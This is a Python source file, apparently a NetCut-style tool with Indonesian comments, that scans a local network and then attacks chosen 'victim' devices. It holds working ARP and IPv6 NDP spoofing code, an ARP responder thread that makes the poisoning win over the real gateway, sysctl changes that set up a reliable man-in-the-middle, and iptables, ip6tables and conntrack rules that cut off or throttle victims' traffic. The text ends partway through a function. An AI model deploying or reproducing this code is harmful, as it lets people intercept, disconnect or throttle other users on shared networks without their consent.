import os
from pathlib import Path
import sys
import subprocess as sp
import logging
import time
from scapy.all import *
import netifaces


LOG_DIR = '/var/log/netcontrol'
if not os.path.isdir(LOG_DIR):
    os.mkdir(LOG_DIR)
    server_log = Path(os.path.join(LOG_DIR, 'netcontrol.log'))
    server_log.touch(exist_ok=True)
    server_log.chmod(0o666)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger('netcontrol-server')
handler = logging.FileHandler(os.path.join(LOG_DIR, 'netcontrol.log'))
formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
handler.setFormatter(formatter)

logger.addHandler(handler)


# def get_ifaces():
#     """
#     all the available network interfaces except  'lo'
#     """
#     ifaces = netifaces.interfaces()
#     if 'lo' in ifaces:
#         ifaces.remove('lo')
#     return ifaces


def get_hostname(ip):
    """
    Cari hostname untuk sebuah IP dengan beberapa metode (berlapis):
      1. mDNS   (avahi-resolve-host-name)   -> Linux/Android/Apple
      2. NetBIOS/SMB (nmap --script nbstat) -> Windows
      3. Reverse DNS (nslookup/host)        -> jaringan dengan DNS lokal
    Mengembalikan string kosong bila tidak ada yang cocok.
    """
    # 1. mDNS - coba 2x (kadang respons pertama lambat)
    for _ in range(2):
        try:
            ans = sp.Popen(['avahi-resolve-host-name', '-a', ip],
                           stdout=sp.PIPE, stderr=sp.PIPE)
            out, _ = ans.communicate(timeout=3)
            if ans.returncode == 0 and out:
                parts = out.decode('utf-8').strip().split('\t')
                if len(parts) >= 2 and parts[1]:
                    name = parts[1].split('.')[0]
                    if name:
                        return name
        except Exception:
            pass

    # 2. NetBIOS / SMB via nmap (Windows & NAS)
    try:
        ans = sp.Popen(['nmap', '-p', '137,139,445', '--script', 'nbstat,smb-os-discovery',
                        '--host-timeout', '15s', ip],
                       stdout=sp.PIPE, stderr=sp.PIPE)
        out, _ = ans.communicate(timeout=25)
        text = out.decode('utf-8', 'ignore')
        for line in text.splitlines():
            line = line.strip()
            # NetBIOS name
            if 'NetBIOS name:' in line:
                n = line.split('NetBIOS name:')[-1].split(',')[0].strip()
                if n:
                    return n
            # SMB computer name
            if 'Computer name:' in line:
                n = line.split('Computer name:')[-1].strip()
                if n:
                    return n
    except Exception:
        pass

    # 3. Reverse DNS
    try:
        ans = sp.Popen(['nslookup', ip], stdout=sp.PIPE, stderr=sp.PIPE)
        out, _ = ans.communicate(timeout=3)
        for line in out.decode('utf-8', 'ignore').splitlines():
            if 'name = ' in line:
                return line.split('name = ')[-1].strip().strip('.')
    except Exception:
        pass

    return ''


def get_vendor(mac):
    """
    Cari nama vendor dari MAC address via database OUI (arp-scan).
    Berguna saat hostname tidak bisa didapat (mis. HP dgn MAC acak).
    """
    if not mac:
        return ''
    prefix = mac.replace(':', '').replace('-', '').lower()[:6]
    for f in ('/usr/share/arp-scan/ieee-oui.txt',
              '/usr/share/arp-scan/ieee-iab.txt',
              '/usr/share/hwdata/oui.txt',
              '/var/lib/misc/oui.txt'):
        try:
            with open(f, 'r', encoding='utf-8', errors='ignore') as fh:
                for line in fh:
                    if line.startswith('#') or not line.strip():
                        continue
                    parts = line.split('\t')
                    if not parts:
                        continue
                    key = parts[0].strip().lower()
                    if key == prefix:
                        return parts[1].strip() if len(parts) > 1 else ''
        except Exception:
            continue
    return ''


def is_random_mac(mac):
    """Deteksi MAC acak (privacy). Bit lokal (bit ke-2 dari oktet pertama) = 1."""
    try:
        first = int(mac.split(':')[0], 16)
        return bool(first & 0x02)
    except Exception:
        return False


def wake_hosts(ip_list, timeout=1):
    """
    Kirim 1 paket ping ke tiap IP supaya perangkat 'bangun' dan
    mau menjawab mDNS/NetBIOS. Tidak menunggu hasil.
    """
    for ip in ip_list:
        try:
            sp.Popen(['ping', '-c', '1', '-W', str(timeout), ip],
                     stdout=sp.DEVNULL, stderr=sp.DEVNULL)
        except Exception:
            pass


def ping_sweep_parallel(ip_list, timeout=1):
    """
    Ping semua IP secara paralel (cepat) untuk membangunkan perangkat
    yang sedang sleep, supaya mau menjawab ARP.
    """
    from concurrent.futures import ThreadPoolExecutor

    def _ping(ip):
        try:
            p = sp.Popen(['ping', '-c', '1', '-W', str(timeout), ip],
                         stdout=sp.DEVNULL, stderr=sp.DEVNULL)
            p.wait(timeout=timeout + 2)
        except Exception:
            pass

    if ip_list:
        with ThreadPoolExecutor(max_workers=128) as pool:
            list(pool.map(_ping, ip_list))


def read_arp_table():
    """
    Baca ARP/neighbour table kernel: {ip: mac} (HANYA IPv4).
    Ini sumber yang SANGAT lengkap karena kernel menyimpan host yang
    pernah berkomunikasi (DHCP, dll), walau arping meleset.
    """
    table = {}
    try:
        p = sp.Popen(['ip', '-4', 'neigh', 'show'], stdout=sp.PIPE, stderr=sp.PIPE)
        out, _ = p.communicate(timeout=5)
        for line in out.decode('utf-8', 'ignore').splitlines():
            parts = line.split()
            if len(parts) < 3:
                continue
            ip = parts[0]
            if 'lladdr' in parts and 'FAILED' not in parts:
                mac = parts[parts.index('lladdr') + 1]
                table[ip] = mac
    except Exception:
        pass
    return table


def get_ipv6_of(mac):
    """
    Cari alamat IPv6 (global atau link-local) untuk sebuah MAC dari
    neighbour table kernel. Mengembalikan string IPv6 atau ''.
    """
    if not mac:
        return ''
    mac = mac.lower()
    try:
        p = sp.Popen(['ip', '-6', 'neigh', 'show'], stdout=sp.PIPE, stderr=sp.PIPE)
        out, _ = p.communicate(timeout=5)
        found_global = ''
        found_ll = ''
        for line in out.decode('utf-8', 'ignore').splitlines():
            parts = line.split()
            if len(parts) < 3 or 'lladdr' not in parts:
                continue
            ip6 = parts[0]
            llmac = parts[parts.index('lladdr') + 1].lower()
            if llmac == mac:
                if ip6.startswith('fe80::'):
                    found_ll = found_ll or ip6
                else:
                    found_global = ip6   # utamakan alamat global
        return found_global or found_ll
    except Exception:
        return ''


def has_ipv6_route():
    """True kalau ada default route IPv6 (artinya jaringan punya IPv6)."""
    try:
        p = sp.Popen(['ip', '-6', 'route', 'show', 'default'],
                     stdout=sp.PIPE, stderr=sp.PIPE)
        out, _ = p.communicate(timeout=5)
        return bool(out.decode('utf-8', 'ignore').strip())
    except Exception:
        return False


def get_my_ipv6_linklocal(iface):
    """Ambil alamat IPv6 link-local milik interface kita (fe80::...)."""
    try:
        p = sp.Popen(['ip', '-6', 'addr', 'show', 'dev', iface, 'scope', 'link'],
                     stdout=sp.PIPE, stderr=sp.PIPE)
        out, _ = p.communicate(timeout=5)
        for line in out.decode('utf-8', 'ignore').splitlines():
            line = line.strip()
            if line.startswith('inet6') and 'fe80' in line:
                return line.split()[1].split('/')[0]
    except Exception:
        pass
    return ''


def get_gw_ipv6_linklocal(iface):
    """Ambil alamat IPv6 link-local gateway dari neighbour table."""
    try:
        p = sp.Popen(['ip', '-6', 'neigh', 'show', 'dev', iface],
                     stdout=sp.PIPE, stderr=sp.PIPE)
        out, _ = p.communicate(timeout=5)
        for line in out.decode('utf-8', 'ignore').splitlines():
            parts = line.split()
            if len(parts) >= 3 and 'router' in parts and parts[0].startswith('fe80'):
                return parts[0]
    except Exception:
        pass
    return ''


def get_victim_ipv6(mac, iface):
    """Cari alamat IPv6 (link-local) victim dari neighbour table via MAC."""
    if not mac:
        return ''
    mac = mac.lower()
    try:
        p = sp.Popen(['ip', '-6', 'neigh', 'show', 'dev', iface],
                     stdout=sp.PIPE, stderr=sp.PIPE)
        out, _ = p.communicate(timeout=5)
        for line in out.decode('utf-8', 'ignore').splitlines():
            parts = line.split()
            if len(parts) >= 3 and 'lladdr' in parts:
                llmac = parts[parts.index('lladdr') + 1].lower()
                if llmac == mac and parts[0].startswith('fe80'):
                    return parts[0]
    except Exception:
        pass
    return ''


def _ndp_spoof_once(victim_mac, victim_v6, gw_v6, my_v6, my_mac, iface):
    """
    Kirim Neighbor Advertisement palsu (ICMPv6 NA) untuk meracuni
    cache IPv6 victim & gateway — analog ARP spoof untuk IPv6.
    """
    from scapy.layers.inet6 import IPv6, ICMPv6ND_NA, ICMPv6NDOptDstLLAddr
    # racuni victim: "gateway ada di MAC kita"
    if gw_v6:
        na = (Ether(src=my_mac, dst=victim_mac) /
              IPv6(src=gw_v6, dst=victim_v6 or 'ff02::1') /
              ICMPv6ND_NA(tgt=gw_v6, R=0, S=0, O=1) /
              ICMPv6NDOptDstLLAddr(lladdr=my_mac))
        try:
            sendp(na, iface=iface, count=1, verbose=0)
        except Exception:
            pass
    # racuni gateway: "victim ada di MAC kita"
    if victim_v6:
        na2 = (Ether(src=my_mac, dst='33:33:00:00:00:01') /
               IPv6(src=victim_v6, dst=gw_v6 or 'ff02::1') /
               ICMPv6ND_NA(tgt=victim_v6, R=0, S=0, O=1) /
               ICMPv6NDOptDstLLAddr(lladdr=my_mac))
        try:
            sendp(na2, iface=iface, count=1, verbose=0)
        except Exception:
            pass



def arp_scan_union(gw_ip, iface=None):
    """
    Scan ARP yang LENGKAP & konsisten dengan menggabungkan beberapa sumber:
      1. ARP table kernel (ip neigh)              -> paling lengkap
      2. arping putaran-1 (timeout cepat 1.2s)
      3. arping putaran-2 (timeout 2.0s)
      4. ping-sweep paralel untuk membangunkan host sebelum arping
    Hasil digabung (union) -> {ip: mac}. Target ~8-10 detik.
    """
    from scapy.all import arping as _arping

    found = {}  # ip -> mac

    # 1. dari ARP table kernel dulu (instan)
    for ip, mac in read_arp_table().items():
        found[ip] = mac

    # tentukan iface
    if iface is None:
        try:
            iface = netifaces.gateways()['default'][netifaces.AF_INET][1]
        except Exception:
            iface = 'wlan0'

    subnet = '{}/24'.format(gw_ip)

    # 2. bangunkan semua host (ping sweep paralel) supaya mau balas ARP
    #    hanya ping alamat dalam subnet ini (timeout pendek, paralel tinggi)
    try:
        base = gw_ip.rsplit('.', 1)[0]
        all_ips = ['{}.{}'.format(base, i) for i in range(1, 255)]
        ping_sweep_parallel(all_ips, timeout=0.3)
    except Exception:
        pass

    # 3. arping 2 putaran (timeout pendek lalu lebih panjang)
    for to, retry in ((1.0, 0), (1.5, 1)):
        try:
            ans, unans = _arping(subnet, timeout=to, retry=retry,
                                 iface=iface, verbose=0)
            for snd, rcv in ans:
                if rcv.psrc and rcv.hwsrc:
                    found[rcv.psrc] = rcv.hwsrc
        except Exception:
            pass

    # 4. refresh ARP table sekali lagi (kemungkinan bertambah setelah sweep)
    for ip, mac in read_arp_table().items():
        found[ip] = mac

    return found


def resolve_hostnames_bulk(ip_list):
    """
    Resolve hostname untuk BANYAK ip sekaligus (cepat):
      1. mDNS paralel (avahi-resolve-host-name) untuk tiap IP
      2. SATU kali nmap NetBIOS/SMB untuk semua IP yang belum dapat nama
    Return: dict {ip: hostname}
    """
    from concurrent.futures import ThreadPoolExecutor, as_completed

    result = {}
    pending = list(ip_list)

    # ---- 1. mDNS paralel ----
    def _mdns(ip):
        try:
            ans = sp.Popen(['avahi-resolve-host-name', '-a', ip],
                           stdout=sp.PIPE, stderr=sp.PIPE)
            out, _ = ans.communicate(timeout=1.5)
            if ans.returncode == 0 and out:
                parts = out.decode('utf-8').strip().split('\t')
                if len(parts) >= 2 and parts[1]:
                    return ip, parts[1].split('.')[0]
        except Exception:
            pass
        return ip, ''

    if pending:
        with ThreadPoolExecutor(max_workers=len(pending)) as pool:
            futs = [pool.submit(_mdns, ip) for ip in pending]
            for f in as_completed(futs, timeout=3):
                try:
                    ip, name = f.result()
                except Exception:
                    continue
                if name:
                    result[ip] = name

    # ---- 2. nmap NetBIOS/SMB SEKALI untuk semua sisa ----
    remaining = [ip for ip in ip_list if ip not in result]
    if remaining:
        try:
            # -T4 cepat, batasi waktu per host agar tidak lama.
            # timeout komunikasi ikut diperketat supaya scan tidak menggantung.
            cmd = ['nmap', '-T4', '-p', '137,139,445', '--script', 'nbstat,smb-os-discovery',
                   '--host-timeout', '5s', '--max-retries', '1']
            cmd += remaining
            ans = sp.Popen(cmd, stdout=sp.PIPE, stderr=sp.PIPE)
            out, _ = ans.communicate(timeout=15)
            text = out.decode('utf-8', 'ignore')

            current_ip = None
            for line in text.splitlines():
                line = line.strip()
                if line.startswith('Nmap scan report for'):
                    part = line.replace('Nmap scan report for', '').strip()
                    # format: "192.168.1.5" atau "name (192.168.1.5)"
                    if '(' in part and ')' in part:
                        current_ip = part.split('(')[-1].rstrip(')').strip()
                        # nama dari format "name (ip)"
                        nm = part.split('(')[0].strip()
                        if nm and current_ip in remaining and current_ip not in result:
                            result[current_ip] = nm
                    else:
                        current_ip = part
                elif current_ip:
                    if 'NetBIOS name:' in line:
                        n = line.split('NetBIOS name:')[-1].split(',')[0].strip()
                        if n and current_ip not in result:
                            result[current_ip] = n
                    elif 'Computer name:' in line:
                        n = line.split('Computer name:')[-1].strip()
                        if n and current_ip not in result:
                            result[current_ip] = n
        except Exception:
            pass

    # isi yang tetap kosong
    for ip in ip_list:
        result.setdefault(ip, '')
    return result


_GW_CACHE = {'t': 0, 'v': None}
_MY_CACHE = {}


def get_default_gw(use_cache=True):
    """
    Get the default gw ip address with the iface.
    Di-cache 30 detik supaya arp_spoof/unspoof tidak lambat
    (dulu tiap panggilan resolve hostname gateway = 8+ detik).
    """
    now = time.time()
    if use_cache and _GW_CACHE['v'] and (now - _GW_CACHE['t']) < 30:
        return _GW_CACHE['v']

    gw = dict()
    if netifaces.AF_INET in netifaces.gateways()['default']:
        default_gw = netifaces.gateways()['default'][netifaces.AF_INET]

        gw_mac = ''
        # baca ARP/neighbour table (cepat)
        try:
            ans = sp.Popen(['ip', 'neigh', 'show', default_gw[0]], stdout=sp.PIPE)
            out = ans.communicate()[0].decode('utf-8')
            for token in out.split():
                if ':' in token and len(token) == 17:
                    gw_mac = token
                    break
        except Exception as e:
            logger.error(sys.exc_info()[1], exc_info=True)

        # kalau belum ada, kirim 1 ARP (timeout pendek)
        if not gw_mac:
            try:
                conf.verb = 0
                results, unanswered = sr(
                    ARP(op=1, psrc='8.8.8.8', pdst=default_gw[0]),
                    iface=default_gw[1], timeout=1.5, verbose=0)
                for snd, rcv in results:
                    if rcv.psrc == default_gw[0]:
                        gw_mac = rcv.hwsrc
            except Exception as e:
                logger.error(sys.exc_info()[1], exc_info=True)

        gw['ip'] = default_gw[0]
        gw['mac'] = gw_mac
        gw['hostname'] = ''   # tidak resolve di sini (mahal); cukup utk label
        gw['iface'] = default_gw[1]

        _GW_CACHE['t'] = now
        _GW_CACHE['v'] = gw
        logger.info('gw successfully retrieved')

    return gw


def get_my(iface, use_cache=True):
    """
    find the IP and MAC  addressess for the given interface (di-cache 30 detik)
    """
    now = time.time()
    cached = _MY_CACHE.get(iface)
    if use_cache and cached and (now - cached['t']) < 30:
        return cached['v']

    my = dict()
    try:
        my['ip'] = get_if_addr(iface)
        my['mac'] = get_if_hwaddr(iface)
        my['hostname'] = ''   # skip resolve (mahal)
        _MY_CACHE[iface] = {'t': now, 'v': my}
        logger.info('My info succssfully retrieved')
    except Exception as e:
        logger.error(sys.exc_info()[1], exc_info=True)
    return my


_IPF_STATE = {'v': None}


def _read_ip_forward():
    try:
        with open('/proc/sys/net/ipv4/ip_forward') as f:
            return f.read().strip()
    except Exception:
        return None


def enable_ip_forward():
    """Aktifkan ip_forward. Idempoten: tidak spawn sysctl jika sudah 1."""
    if _IPF_STATE['v'] == '1' or _read_ip_forward() == '1':
        _IPF_STATE['v'] = '1'
        return
    try:
        sp.Popen(['sysctl', '-w', 'net.ipv4.ip_forward=1'])
        _IPF_STATE['v'] = '1'
        logger.info('IP forward Enabled')
    except Exception as e:
        logger.error(sys.exc_info()[1], exc_info=True)


def disable_ip_forward():
    """Matikan ip_forward. Idempoten: tidak spawn sysctl jika sudah 0."""
    # reset cache MITM: forwarding dimatikan, jadi setup_mitm harus
    # menjalankan ulang sysctl saat ada victim baru (fix bug: limit
    # tidak jalan karena ip_forward tidak dinyalakan lagi).
    _MITM_READY['v'] = False
    if _IPF_STATE['v'] == '0' or _read_ip_forward() == '0':
        _IPF_STATE['v'] = '0'
        return
    try:
        sp.Popen(['sysctl', '-w', 'net.ipv4.ip_forward=0'])
        _IPF_STATE['v'] = '0'
        logger.info('IP Forward Disabled')
    except Exception as e:
        logger.error(sys.exc_info()[1], exc_info=True)


# ── Setup MITM yang benar ───────────────────────────────────────────
# Supaya ARP spoof benar-benar jadi jalan satu-satunya bagi victim:
#  1. ip_forward=1                    → kita mau meneruskan
#  2. send_redirects=0 (all & iface)  → JANGAN kirim ICMP redirect,
#     kalau tidak victim diberi tahu "gateway langsung, lewati aku!"
#     (ini penyebab klasik MITM gagal / YouTube tetap lancar)
#  3. rp_filter=0                     → jangan drop paket forwarded
#     (source victim datang dari wlan0, route keluar wlan0 → dianggap
#      spoofed oleh rp_filter ketat)
_MITM_READY = {'v': False}


def setup_mitm(iface=None):
    """Aktifkan sysctl yang diperlukan untuk MITM yang andal (idempoten)."""
    if iface is None:
        try:
            iface = netifaces.gateways()['default'][netifaces.AF_INET][1]
        except Exception:
            iface = 'wlan0'
    # cache hanya valid kalau ip_forward benar-benar masih hidup.
    # (kalau tidak, resume->limit akan salah menganggap sudah siap)
    if _MITM_READY['v'] == iface and _read_ip_forward() == '1':
        return
    cmds = [
        ['sysctl', '-w', 'net.ipv4.ip_forward=1'],
        # IPv6: dibutuhkan kalau kita jadi MITM untuk IPv6 juga
        ['sysctl', '-w', 'net.ipv6.conf.all.forwarding=1'],
        # jangan kirim ICMP redirect ke victim
        ['sysctl', '-w', 'net.ipv4.conf.all.send_redirects=0'],
        ['sysctl', '-w', 'net.ipv4.conf.default.send_redirects=0'],
        ['sysctl', '-w', 'net.ipv4.conf.{}.send_redirects=0'.format(iface)],
        # jangan terima redirect (biar routing kita stabil)
        ['sysctl', '-w', 'net.ipv4.conf.all.accept_redirects=0'],
        ['sysctl', '-w', 'net.ipv4.conf.{}.accept_redirects=0'.format(iface)],
        # matikan reverse-path filter yang bisa membuang paket forward
        ['sysctl', '-w', 'net.ipv4.conf.all.rp_filter=0'],
        ['sysctl', '-w', 'net.ipv4.conf.default.rp_filter=0'],
        ['sysctl', '-w', 'net.ipv4.conf.{}.rp_filter=0'.format(iface)],
    ]
    for c in cmds:
        try:
            sp.Popen(c, stdout=sp.DEVNULL, stderr=sp.DEVNULL)
        except Exception:
            pass
    _MITM_READY['v'] = iface
    _IPF_STATE['v'] = '1'
    logger.info('MITM sysctl ready on {} (redirects off, rp_filter off)'.format(iface))


# cache IPv6 (dihitung sekali, jaringan tidak sering berubah)
_IPV6_CACHE = {'net': None, 'my': {}, 'gw': {}, 'victim': {}}


def _get_my_v6_cached(iface):
    if iface not in _IPV6_CACHE['my']:
        _IPV6_CACHE['my'][iface] = get_my_ipv6_linklocal(iface)
    return _IPV6_CACHE['my'][iface]


def _get_gw_v6_cached(iface):
    if iface not in _IPV6_CACHE['gw']:
        _IPV6_CACHE['gw'][iface] = get_gw_ipv6_linklocal(iface)
    return _IPV6_CACHE['gw'][iface]


def _get_victim_ipv6_cached(victim, iface):
    mac = (victim.get('mac') or '').lower()
    if not mac:
        return ''
    now = time.time()
    entry = _IPV6_CACHE['victim'].get(mac)
    if entry and (now - entry.get('t', 0)) <= 5:
        return entry.get('v', '')
    v6 = get_victim_ipv6(mac, iface)
    _IPV6_CACHE['victim'][mac] = {'t': now, 'v': v6}
    return v6


# ── ARP responder (thread) ──────────────────────────────────────────
# Menjawab ARP REQUEST dari victim SECARA INSTAN dengan "gateway is-at
# MAC-kita". Ini yang membuat cut KONSISTEN: kalau hanya mengandalkan
# spoof periodik, saat cache victim expired & victim menanyakan gateway,
# gateway asli menjawab lebih cepat dari spoof kita → victim kembali
# online. Dengan responder ini, setiap permintaan victim langsung kita
# balas sebelum gateway sempat menjawab.
_ARP_RESPONDER = {'running': False, 'thread': None, 'victim_macs': {},
                  'gw': None, 'my': None, 'iface': None}


def _arp_responder_loop():
    """Sniff ARP request dari victim & balas seketika (thread daemon)."""
    import threading

    def _handle(pkt):
        try:
            if not pkt.haslayer(ARP):
                return
            arp = pkt[ARP]
            # hanya ARP REQUEST (op=1) yang menanyakan gateway
            if arp.op != 1:
                return
            vmac = (pkt[Ether].src or '').lower()
            r = _ARP_RESPONDER
            if vmac not in r['victim_macs']:
                return
            gw = r['gw']
            my = r['my']
            if gw is None or my is None:
                return
            # HANYA balas kalau yang ditanyakan = IP gateway
            if arp.pdst != gw['ip']:
                return
            # kirim jawaban: "gateway ada di MAC kita"
            reply = (Ether(src=my['mac'], dst=vmac) /
                     ARP(op=2, psrc=gw['ip'], hwsrc=my['mac'],
                         pdst=arp.psrc, hwdst=vmac))
            sendp(reply, iface=r['iface'], count=2, verbose=0)
            logger.info('ARP responder: balas request {} (victim {})'.format(
                gw['ip'], arp.psrc))
        except Exception:
            pass

    try:
        sniff(iface=_ARP_RESPONDER['iface'],
              filter='arp and arp[6:2] = 1', prn=_handle,
              store=0, stop_filter=lambda p: not _ARP_RESPONDER['running'])
    except Exception as e:
        logger.error('arp responder loop err: {}'.format(e))


def start_arp_responder(iface):
    """Mulai thread ARP responder (sekali saja)."""
    import threading
    if _ARP_RESPONDER['running']:
        return
    _ARP_RESPONDER['iface'] = iface
    _ARP_RESPONDER['running'] = True
    t = threading.Thread(target=_arp_responder_loop, daemon=True)
    t.start()
    _ARP_RESPONDER['thread'] = t
    logger.info('ARP responder started on {}'.format(iface))


def register_victim_mac(mac, gw=None, my=None):
    """Daftarkan MAC victim yang akan dilayani ARP responder."""
    if mac:
        _ARP_RESPONDER['victim_macs'][mac.lower()] = True
    if gw is not None:
        _ARP_RESPONDER['gw'] = gw
    if my is not None:
        _ARP_RESPONDER['my'] = my


def unregister_victim_mac(mac):
    if mac:
        _ARP_RESPONDER['victim_macs'].pop(mac.lower(), None)


def _build_arp_pair(victim, gw, my):
    """Bangun 2 paket ARP (ke victim & ke gateway)."""
    to_victim = (Ether(src=my['mac'], dst=victim['mac']) /
                 ARP(op=2, psrc=gw['ip'], hwsrc=my['mac'],
                     pdst=victim['ip'], hwdst=victim['mac']))
    to_gw = (Ether(src=my['mac'], dst=gw['mac']) /
             ARP(op=2, psrc=victim['ip'], hwsrc=my['mac'],
                 pdst=gw['ip'], hwdst=gw['mac']))
    return to_victim, to_gw


def arp_spoof_burst(victim, count=8):
    """
    Kirim ARP spoof BANYAK sekaligus (burst). Dipakai saat cut PERTAMA
    supaya ARP cache victim & gateway langsung teracuni tanpa menunggu
    siklus scheduler (ini yang membuat hasil "tidak konsisten": saat
    cache victim masih fresh, spoof pelan tidak langsung menang).
    """
    gw = get_default_gw()
    my = get_my(gw['iface'])
    iface = gw['iface']
    if not victim.get('mac'):
        return
    to_victim, to_gw = _build_arp_pair(victim, gw, my)
    try:
        sendp(to_victim, iface=iface, count=count, inter=0.05, verbose=0)
        sendp(to_gw, iface=iface, count=count, inter=0.05, verbose=0)
        logger.info('ARP spoof BURST x{} sent to {}'.format(count, victim['ip']))
    except Exception as e:
        logger.error('arp_spoof_burst err: {}'.format(e))
    # NDP burst juga
    try:
        if has_ipv6_route():
            v6 = get_victim_ipv6(victim['mac'], iface)
            my_v6 = get_my_ipv6_linklocal(iface)
            gw_v6 = get_gw_ipv6_linklocal(iface)
            if v6 and my_v6:
                for _ in range(count):
                    _ndp_spoof_once(victim['mac'], v6, gw_v6, my_v6,
                                    my['mac'], iface)
    except Exception as e:
        logger.error('ndp burst err: {}'.format(e))


def arp_spoof(victim):
    """
    Kirim ARP is-at palsu ke victim & gateway (dipanggil scheduler).

    DIOPTIMASI:
      - pakai _build_arp_pair & 1 count (seperti sebelumnya) untuk
        siklus rutin.
      - NDP spoof TIDAK dipanggil tiap siklus kalau tidak perlu (mahal:
        spawn `ip -6 neigh`). Kita cache alamat IPv6 victim dan hanya
        refresh sesekali supaya siklus tetap < 0.5s (ini penyebab lain
        dari inkonsistensi saat banyak victim).
    """
    gw = get_default_gw()
    my = get_my(gw['iface'])
    iface = gw['iface']
    if not victim.get('mac'):
        return

    to_victim, to_gw = _build_arp_pair(victim, gw, my)
    try:
        sendp(to_victim, iface=iface, count=1, verbose=0)
        sendp(to_gw, iface=iface, count=1, verbose=0)
    except Exception as e:
        logger.error('arp_spoof err: {}'.format(e))

    # ── IPv6 (NDP) spoof — pakai cache, hanya refresh tiap ~5 detik ──
    try:
        if _IPV6_CACHE['net'] is None:
            _IPV6_CACHE['net'] = has_ipv6_route()
        if _IPV6_CACHE['net']:
            now = time.time()
            mac = victim['mac'].lower()
            entry = _IPV6_CACHE['victim'].get(mac)
            if not entry or (now - entry['t']) > 5:
                v6 = get_victim_ipv6(mac, iface)
                _IPV6_CACHE['victim'][mac] = {'t': now, 'v': v6}
            else:
                v6 = entry['v']
            if v6:
                my_v6 = _get_my_v6_cached(iface)
                gw_v6 = _get_gw_v6_cached(iface)
                if my_v6:
                    _ndp_spoof_once(victim['mac'], v6, gw_v6, my_v6,
                                    my['mac'], iface)
    except Exception as e:
        logger.error('ndp_spoof err: {}'.format(e))


def arp_unspoof(victim):
    gw = get_default_gw()
    my = get_my(gw['iface'])
    iface = gw['iface']
    logger.info('resuming host {}'.format(victim['ip']))

    # Kembalikan ARP cache victim: "gateway ada di MAC gateway"
    to_victim = (Ether(src=gw['mac'], dst=victim['mac']) /
                 ARP(op=2, psrc=gw['ip'], hwsrc=gw['mac'],
                     pdst=victim['ip'], hwdst=victim['mac']))

    # Kembalikan ARP cache gateway: "victim ada di MAC victim"
    to_gw = (Ether(src=victim['mac'], dst=gw['mac']) /
             ARP(op=2, psrc=victim['ip'], hwsrc=victim['mac'],
                 pdst=gw['ip'], hwdst=gw['mac']))

    try:
        sendp(to_victim, iface=iface, count=5, verbose=0)
        sendp(to_gw, iface=iface, count=5, verbose=0)
        logger.info('Done Resuming host')
    except Exception as e:
        logger.error(sys.exc_info()[1], exc_info=True)


def apply_cut_drop(victim, flush_conntrack=False):
    """
    Terapkan aturan DROP supaya trafik victim BENAR-BENAR terputus.

    PENTING (fix celah): fungsi ini dipanggil tiap 0.5 detik oleh
    scheduler.  Versi lama melakukan "hapus dulu → tambah ulang" yang
    menciptakan CELAH beberapa milidetik di mana tidak ada rule DROP →
    paket victim lolos (YouTube tetap jalan).  Sekarang kita pakai
    `iptables -C` untuk cek keberadaan rule; kalau sudah ada, TIDAK
    menyentuh sama sekali (tidak ada celah, counter tidak reset).

    flush_conntrack: kirim sinyal bunuh koneksi established.  Hanya
    perlu saat PERTAMA kali cut; scheduler tidak perlu tiap 0.5s.
    """
    ip = victim.get('ip')
    if not ip:
        return

    for match in (['-s', ip], ['-d', ip]):
        # cek: rule sudah ada? -> jangan diganggu (zero gap)
        rc, _, _ = _run(['iptables', '-C', 'FORWARD'] + match + ['-j', 'DROP'])
        if rc == 0:
            continue
        # belum ada (atau ada duplikat) -> pastikan hanya 1 rule terpasang
        # dengan membersihkan duplikat dulu, lalu tambah satu.
        for _ in range(4):
            rc2, _, _ = _run(['iptables', '-D', 'FORWARD'] + match + ['-j', 'DROP'])
            if rc2 != 0:
                break
        _run(['iptables', '-A', 'FORWARD'] + match + ['-j', 'DROP'])

    # ── IPv6: drop trafik victim berbasis MAC ───────────────────────
    # ARP spoof (IPv4) TIDAK mempengaruhi IPv6. Kalau jaringan punya
    # IPv6 (router mengirim RA), victim bisa lolos lewat IPv6 meski
    # IPv4 sudah di-DROP. Kita drop berdasarkan MAC victim.
    mac = (victim.get('mac') or '').lower()
    if mac:
        for match in (['-m', 'mac', '--mac-source', mac],
                      ['-m', 'mac', '--dst-mac', mac]):
            rc, _, _ = _run(['ip6tables', '-C', 'FORWARD'] + match + ['-j', 'DROP'])
            if rc == 0:
                continue
            for _ in range(4):
                rc2, _, _ = _run(['ip6tables', '-D', 'FORWARD'] + match + ['-j', 'DROP'])
                if rc2 != 0:
                    break
            _run(['ip6tables', '-A', 'FORWARD'] + match + ['-j', 'DROP'])

    # bunuh koneksi established — cukup sekali saat cut pertama
    if flush_conntrack:
        try:
            sp.Popen(['conntrack', '-D', '-s', ip],
                     stdout=sp.DEVNULL, stderr=sp.DEVNULL)
        except Exception:
            pass


def remove_cut_drop(victim):
    """
    Hapus SEMUA aturan DROP cut untuk victim (saat resume).
    Loop sampai tidak ada rule yang cocok lagi, supaya kalau
    scheduler sempat menambah rule berkali-kali, semuanya bersih.
    """
    ip = victim.get('ip')
    if not ip:
        return
    # loop maksimal 10x untuk tiap arah — cukup untuk kasus rule menumpuk
    for match in (['-s', ip], ['-d', ip]):
        for _ in range(10):
            rc, _, _ = _run(['iptables', '-D', 'FORWARD'] + match + ['-j', 'DROP'])
            if rc != 0:
                break
    # IPv6 (berbasis MAC)
    mac = (victim.get('mac') or '').lower()
    if mac:
        for match in (['-m', 'mac', '--mac-source', mac],
                      ['-m', 'mac', '--dst-mac', mac]):
            for _ in range(10):
                rc, _, _ = _run(['ip6tables', '-D', 'FORWARD'] + match + ['-j', 'DROP'])
                if rc != 0:
                    break


def generate_mac():
	return ':'.join(map(lambda x: "%02x" % x, [ 0x00,
												random.randint(0x00, 0x7f),
												random.randint(0x00, 0x7f),
												random.randint(0x00, 0x7f),
												random.randint(0x00, 0xff),
												random.randint(0x00, 0xff)]))


# ---------------------------------------------------------------
#  Bandwidth limiting (seperti NetCut: tambah/kurangi kecepatan)
# ---------------------------------------------------------------
# Cara kerja:
#   - target sudah di ARP-spoof (kita jadi gateway-nya)
#   - upload  target -> kita : dibatasi di IFB (kita arah masuk)
#   - download kita -> target: dibatasi di egress wlan0
# Satuan rate: kbit (kilobit/detik). 0 = tidak dibatasi.

def _run(cmd):
    p = sp.Popen(cmd, stdout=sp.PIPE, stderr=sp.PIPE)
    out, err = p.communicate(timeout=15)
    return p.returncode, out.decode('utf-8', 'ignore'), err.decode('utf-8', 'ignore')


def _find_my_ip_on(gw):
    """IP dari interface yang sedang kita pakai (untuk filter 'dst target')."""
    try:
